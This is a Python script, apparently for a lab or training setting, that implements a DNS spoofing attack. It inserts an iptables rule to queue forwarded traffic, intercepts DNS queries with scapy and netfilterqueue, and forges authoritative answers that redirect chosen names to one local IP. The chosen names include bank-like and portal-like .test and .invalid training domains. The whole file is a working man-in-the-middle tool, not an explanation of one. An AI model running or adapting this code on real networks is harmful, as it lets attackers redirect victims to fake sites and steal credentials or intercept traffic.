import os
import sys
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue


class DnsSnoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("Snoofing....")
        os.system(
            'iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(self.queueNum)
        )
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(
                'iptables -D FORWARD -j NFQUEUE --queue-num {}'.format(self.queueNum)
            )
            log.info("[!] iptable rule flushed")

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNS):
            dnsLayer = scapyPacket[DNS]
            if dnsLayer.qr == 0 and dnsLayer.qd is not None:
                try:
                    queryName = dnsLayer.qd.qname
                    log.info('[query] ' + str(queryName))
                    if queryName in self.hostDict:
                        log.info('[MATCH] ' + str(queryName) + ' -> ' + str(self.hostDict[queryName]))
                        scapyPacket.src, scapyPacket.dst = scapyPacket.dst, scapyPacket.src
                        scapyPacket[UDP].sport, scapyPacket[UDP].dport = 53, scapyPacket[UDP].sport
                        dnsLayer.qr = 1
                        dnsLayer.aa = 1
                        dnsLayer.rd = 0
                        dnsLayer.ra = 1
                        dnsLayer.an = DNSRR(rrname=queryName, rdata=self.hostDict[queryName], ttl=300)
                        del scapyPacket[IP].len
                        del scapyPacket[IP].chksum
                        del scapyPacket[UDP].len
                        del scapyPacket[UDP].chksum
                        packet.set_payload(bytes(scapyPacket))
                        log.info('[SPOOFED] ' + str(queryName) + ' -> ' + str(self.hostDict[queryName]))
                except Exception as e:
                    log.error('error: ' + str(e))
        return packet.accept()


if __name__ == '__main__':
    try:
        hostDict = {
            b"portal.icdfa.test.": "192.168.199.128",
            b"bank.training.invalid.": "192.168.199.128",
            b"secure.icdfa.test.": "192.168.199.128"
        }
        queueNum = 1
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        snoof = DnsSnoof(hostDict, queueNum)
        snoof()
    except OSError as error:
        log.error(error)
